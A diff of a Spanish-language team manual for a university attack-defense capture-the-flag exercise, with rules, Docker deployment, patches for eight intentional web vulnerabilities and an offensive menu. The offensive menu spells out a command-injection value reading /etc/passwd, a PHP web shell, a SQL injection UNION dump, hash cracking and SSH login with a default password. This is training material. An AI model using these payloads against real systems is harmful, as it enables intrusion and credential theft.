@@ -1,7 +1,6 @@
-# Equipo UWS — UCC Web Services | VM2
+# Equipo IDS — Ibague Data Services | VM1
 
-> Este README es el **manual unico** del **Equipo UWS**.
-> Sos responsable de **operar y defender la VM2 (UWS)** Y de **atacar la VM1 del rival (Equipo IDS)**.
+> Sos responsable de **operar y defender la VM1 (IDS)** Y de **atacar la VM2 del rival (Equipo UWS)**.
 > Duracion del ejercicio: **3 horas**.
 
 ---
@@ -10,12 +9,12 @@
 
 | Equipo                  | VM   | Servicio web                                  | SSH                                       |
 |-------------------------|------|-----------------------------------------------|-------------------------------------------|
-| **TU equipo (UWS)**     | VM2  | UWS — `http://<IP-VM2>:8081`                  | `ssh admin@<IP-VM2> -p 2223` (`password123`) |
-| Rival (Equipo IDS)      | VM1  | IDS — `http://<IP-VM1>:8080`                  | `ssh admin@<IP-VM1> -p 2222` (`password123`) |
+| **TU equipo (IDS)**     | VM1  | IDS — `http://<IP-VM1>:8080`                  | `ssh admin@<IP-VM1> -p 2222` (`password123`) |
+| Rival (Equipo UWS)      | VM2  | UWS — `http://<IP-VM2>:8081`                  | `ssh admin@<IP-VM2> -p 2223` (`password123`) |
 | Scoreboard (compartido) | VM3  | `http://<IP-SCOREBOARD>:9000`                 | —                                         |
 
 > Pediles las IPs al instructor. La variable `SCOREBOARD_URL` ya quedo configurada en tu VM
-> al momento del despliegue, asi que el dashboard de UWS muestra un banner con el link directo.
+> al momento del despliegue, asi que el dashboard de IDS muestra un banner con el link directo.
 
 ---
 
@@ -23,9 +22,9 @@
 
 Ganan puntos quienes cumplan **simultaneamente** estos tres objetivos:
 
-1. **Tu servicio UWS (`http://<IP-VM2>:8081`) debe seguir respondiendo** durante toda la duracion del ejercicio. El instructor lo verifica con health checks periodicos (HTTP 200 sobre `/`).
-2. **Conseguir banderas del rival** (todas con prefijo `FLAG{UCC_IDS_*}`) y/o **acumular mas puntos** que el rival al cierre.
-3. **Si UWS queda caido o eliminado por mas de 10 minutos consecutivos**, **pierden por knock-out**: el rival gana automaticamente sin importar el marcador.
+1. **Tu servicio IDS (`http://<IP-VM1>:8080`) debe seguir respondiendo** durante toda la duracion del ejercicio. El instructor lo verifica con health checks periodicos (HTTP 200 sobre `/`).
+2. **Conseguir banderas del rival** (todas con prefijo `FLAG{UCC_UWS_*}`) y/o **acumular mas puntos** que el rival al cierre.
+3. **Si IDS queda caido o eliminado por mas de 10 minutos consecutivos**, **pierden por knock-out**: el rival gana automaticamente sin importar el marcador.
 
 ### Objetivos adicionales sugeridos (sumar/restar puntos)
 
@@ -48,45 +47,45 @@ Ganan puntos quienes cumplan **simultaneamente** estos tres objetivos:
   **Modificar si**, borrar **no**.
 - No podes hacer DoS / flood al rival. El objetivo es **ganarles banderas**, no tirarles el servicio a la fuerza.
 - No podes atacar nada fuera del scope (IPs ajenas a las VMs del lab, internet, infra de la universidad).
-- La bandera SSH (`/home/admin/flag.txt` dentro del contenedor `ctf2_db_ssh`) **debe permanecer en su ruta original** y **legible por el usuario `admin`**. Esta permitido endurecer el login (password fuerte, `fail2ban`, `MaxAuthTries`, deshabilitar `PasswordAuthentication` y exigir llave publica), pero **NO** podes mover, ocultar, encriptar ni borrar el archivo, ni eliminar al usuario `admin`. La defensa es *auth hardening*, no *hide the file*.
+- La bandera SSH (`/home/admin/flag.txt` dentro del contenedor `ctf1_db_ssh`) **debe permanecer en su ruta original** y **legible por el usuario `admin`**. Esta permitido endurecer el login (password fuerte, `fail2ban`, `MaxAuthTries`, deshabilitar `PasswordAuthentication` y exigir llave publica), pero **NO** podes mover, ocultar, encriptar ni borrar el archivo, ni eliminar al usuario `admin`. La defensa es *auth hardening*, no *hide the file*.
 - No podes compartir banderas con el equipo rival (es un CTF, no una clase de etica fallida).
 
 ---
 
 ## 4. Despliegue de tu VM (sysadmin del equipo)
 
-Asumiendo que el instructor te dio acceso a la VM2 con Docker instalado:
+Asumiendo que el instructor te dio acceso a la VM1 con Docker instalado:
 
 ```bash
-cd ~/ctf2                                          # carpeta del proyecto en la VM
+cd ~/ctf1                                          # carpeta del proyecto en la VM
 export SCOREBOARD_URL="http://<IP-SCOREBOARD>:9000"
 docker compose up -d --build
 docker compose ps                                  # ambos containers UP
-curl -sI http://localhost:8081 | head -n 1         # debe responder 200
+curl -sI http://localhost:8080 | head -n 1         # debe responder 200
 ```
 
 Servicios que vas a operar:
 
 | Container       | Puerto host | Para que                                      |
 |-----------------|-------------|-----------------------------------------------|
-| `ctf2_web_app`  | `8081`      | Apache + PHP. Aca vive `index.php`, `admin.php`, etc. |
-| `ctf2_db_ssh`   | `2223`      | MariaDB + OpenSSH. SSH para pivot interno.    |
+| `ctf1_web_app`  | `8080`      | Apache + PHP. Aca vive `index.php`, `admin.php`, etc. |
+| `ctf1_db_ssh`   | `2222`      | MariaDB + OpenSSH. SSH para pivot interno.    |
 
 Tail de logs en tiempo real (util para deteccion):
 
 ```bash
-docker logs -f ctf2_web_app   # accesos HTTP, errores PHP
-docker logs -f ctf2_db_ssh    # auth ssh, queries MySQL
+docker logs -f ctf1_web_app   # accesos HTTP, errores PHP
+docker logs -f ctf1_db_ssh    # auth ssh, queries MySQL
 ```
 
 ---
 
 ## 5. Tu superficie defensiva (parchear lo tuyo)
 
-Tu UWS tiene **8 vulnerabilidades intencionales** que el rival va a explotar. Acá tenés
+Tu IDS tiene **8 vulnerabilidades intencionales** que el rival va a explotar. Acá tenés
 la lista priorizada y un fix corto por cada una. **Apliquen los parches en caliente sin tumbar el servicio.**
 
-| # | Vector                | Endpoint propio          | Fix sugerido (en `ctf2/servidor_web/`)                                  |
+| # | Vector                | Endpoint propio          | Fix sugerido (en `ctf1/servidor_web/`)                                  |
 |---|-----------------------|--------------------------|-------------------------------------------------------------------------|
 | 1 | SQL Injection         | `/index.php`             | `mysqli_prepare(...)` + `bind_param("ss", $user, $pass)`                |
 | 2 | Cookie tamper         | `/admin.php`             | Validar `$_SESSION['ctf_role']`, **eliminar** la lectura de `$_COOKIE['role']` |
@@ -95,7 +94,7 @@ la lista priorizada y un fix corto por cada una. **Apliquen los parches en calie
 | 5 | Command Injection     | `/network.php`           | `escapeshellarg($host)` + regex blanca `^[a-zA-Z0-9._-]+$`              |
 | 6 | Upload RCE            | `/upload.php`            | Whitelist de extensiones + rename a `bin2hex(random_bytes(8)).ext` + `.htaccess` con `php_flag engine off` en `uploads/` |
 | 7 | Hash leak             | tabla `secrets` (DB)     | `DELETE FROM secrets WHERE label LIKE 'legacy_md5_%';` y `REVOKE SELECT ON ctf_login.secrets FROM 'ctf_web'@'%';` |
-| 8 | SSH pivot             | container `ctf2_db_ssh`  | `passwd admin` (password fuerte), en `/etc/ssh/sshd_config` poner `PermitRootLogin no`, `MaxAuthTries 3`, `LoginGraceTime 10`, opcional `PasswordAuthentication no` + llave publica precargada. `service ssh restart`. **No** mover la flag (regla del juego, ver seccion 3) |
+| 8 | SSH pivot             | container `ctf1_db_ssh`  | `passwd admin` (password fuerte), en `/etc/ssh/sshd_config` poner `PermitRootLogin no`, `MaxAuthTries 3`, `LoginGraceTime 10`, opcional `PasswordAuthentication no` + llave publica precargada. `service ssh restart`. **No** mover la flag (regla del juego, ver seccion 3) |
 
 ### Snippets de fix listos para copiar
 
@@ -131,25 +130,25 @@ echo '<input type="hidden" name="csrf" value="'.$_SESSION['csrf'].'">';
 ```
 
 > Despues de cada parche **probar manualmente que el sitio sigue funcionando** (login, dashboard, admin).
-> El downtime se cuenta automatico. Si rompiste el deploy, `docker compose restart ctf2_web_app`.
+> El downtime se cuenta automatico. Si rompiste el deploy, `docker compose restart ctf1_web_app`.
 
 ---
 
-## 6. Tu menu ofensivo (atacar al rival IDS)
+## 6. Tu menu ofensivo (atacar al rival UWS)
 
-El rival corre **el mismo set de vulnerabilidades** sobre `http://<IP-VM1>:8080`.
-Las banderas del rival tienen prefijo `FLAG{UCC_IDS_*}`.
+El rival corre **el mismo set de vulnerabilidades** sobre `http://<IP-VM2>:8081`.
+Las banderas del rival tienen prefijo `FLAG{UCC_UWS_*}`.
 
 | # | Vector              | URL en el rival                                | Bandera (a enviar al scoreboard)              | Pts |
 |---|---------------------|------------------------------------------------|------------------------------------------------|-----|
-| 1 | SQL Injection       | `http://<IP-VM1>:8080/index.php`               | `FLAG{UCC_IDS_SQLi_Bypass}`                    | 50  |
-| 2 | Cookie tamper       | `http://<IP-VM1>:8080/admin.php` con `role=admin` | `FLAG{UCC_IDS_Cookie_Bypass}`               | 75  |
-| 3 | LFI                 | `/download.php?file=admin_notes.md`            | `FLAG{UCC_IDS_LFI_Found}`                      | 60  |
-| 4 | Config leak via LFI | `/download.php?file=../config/app.ini`         | `FLAG{UCC_IDS_Config_Leaked}`                  | 70  |
-| 5 | Command Injection   | `/network.php` (host `db_ssh; cat /etc/passwd`)| `FLAG{UCC_IDS_Cmd_Inject}`                     | 80  |
-| 6 | Upload RCE          | `/upload.php` subiendo `shell.php`             | `FLAG{UCC_IDS_Upload_RCE}`                     | 120 |
-| 7 | Hash cracking       | tabla `secrets` (via SQLi UNION)               | `FLAG{UCC_IDS_Hash_Cracked}`                   | 100 |
-| 8 | SSH pivot           | `ssh admin@<IP-VM1> -p 2222`                   | `FLAG{UCC_Ciber_Atrapada}`                     | 150 |
+| 1 | SQL Injection       | `http://<IP-VM2>:8081/index.php`               | `FLAG{UCC_UWS_SQLi_Bypass}`                    | 50  |
+| 2 | Cookie tamper       | `http://<IP-VM2>:8081/admin.php` con `role=admin` | `FLAG{UCC_UWS_Cookie_Bypass}`               | 75  |
+| 3 | LFI                 | `/download.php?file=admin_notes.md`            | `FLAG{UCC_UWS_LFI_Found}`                      | 60  |
+| 4 | Config leak via LFI | `/download.php?file=../config/app.ini`         | `FLAG{UCC_UWS_Config_Leaked}`                  | 70  |
+| 5 | Command Injection   | `/network.php` (host `db_ssh; cat /etc/passwd`)| `FLAG{UCC_UWS_Cmd_Inject}`                     | 80  |
+| 6 | Upload RCE          | `/upload.php` subiendo `shell.php`             | `FLAG{UCC_UWS_Upload_RCE}`                     | 120 |
+| 7 | Hash cracking       | tabla `secrets` (via SQLi UNION)               | `FLAG{UCC_UWS_Hash_Cracked}`                   | 100 |
+| 8 | SSH pivot           | `ssh admin@<IP-VM2> -p 2223`                   | `FLAG{UCC_UWS_Pwned}`                          | 150 |
 
 ### Quick wins (5 sub-grupos de 3 personas)
 
@@ -176,15 +175,15 @@ Login OK -> bandera SQLi. Despues abrir DevTools -> Application -> Cookies -> ag
    <?php system($_GET['c']); ?>
    ```
 2. Subirlo via `/upload.php`.
-3. Ejecutar: `http://<IP-VM1>:8080/uploads/shell.php?c=cat+/var/www/html/config/app.ini`.
+3. Ejecutar: `http://<IP-VM2>:8081/uploads/shell.php?c=cat+/var/www/html/config/app.ini`.
 
 **SubGrupo E — Hash + SSH:**
 1. SQLi UNION: `' UNION SELECT 1,label,value FROM secrets -- `
 2. Copiar los 3 hashes MD5 -> `hashcat -m 0 hashes.txt rockyou.txt`
-3. Reportar `FLAG{UCC_IDS_Hash_Cracked}`.
-4. Con `admin/password123` -> `ssh admin@<IP-VM1> -p 2222` -> `cat /home/admin/flag.txt`.
+3. Reportar `FLAG{UCC_UWS_Hash_Cracked}`.
+4. Con `admin/password123` -> `ssh admin@<IP-VM2> -p 2223` -> `cat /home/admin/flag.txt`.
 
-> **Roadmap rapido del rival:** `http://<IP-VM1>:8080/robots.txt` lista todos los endpoints "ocultos".
+> **Roadmap rapido del rival:** `http://<IP-VM2>:8081/robots.txt` lista todos los endpoints "ocultos".
 
 ---
 
@@ -194,9 +193,9 @@ Login OK -> bandera SQLi. Despues abrir DevTools -> Application -> Cookies -> ag
   **NO la envien al scoreboard**: resta 50 pts. Si la encuentran y la reportan al instructor,
   ganan 25 pts de inteligencia.
 - Cada bandera real cuenta **una sola vez** por equipo (la primera entrega es la valida).
-- El scoreboard pide **alias** y **equipo** (`ids` / `uws`). Pongan siempre `uws`.
+- El scoreboard pide **alias** y **equipo** (`ids` / `uws`). Pongan siempre `ids`.
 
-URL: `http://<IP-SCOREBOARD>:9000` (tambien linkeado desde el banner del dashboard de UWS).
+URL: `http://<IP-SCOREBOARD>:9000` (tambien linkeado desde el banner del dashboard de IDS).
 
 ---
 
@@ -214,8 +213,8 @@ Al terminar las 3 horas, entreguen un PDF de **1 pagina** con:
 ## 9. Estructura de la VM
 
 ```
-ctf2/
-├── README.md                 ← este archivo (manual unico del Equipo UWS)
+ctf1/
+├── README.md                 ← este archivo (manual unico del Equipo IDS)
 ├── docker-compose.yml        ← levanta web_app + db_ssh
 ├── servidor_web/             ← codigo PHP que tenes que defender
 │   ├── index.php             ← SQLi
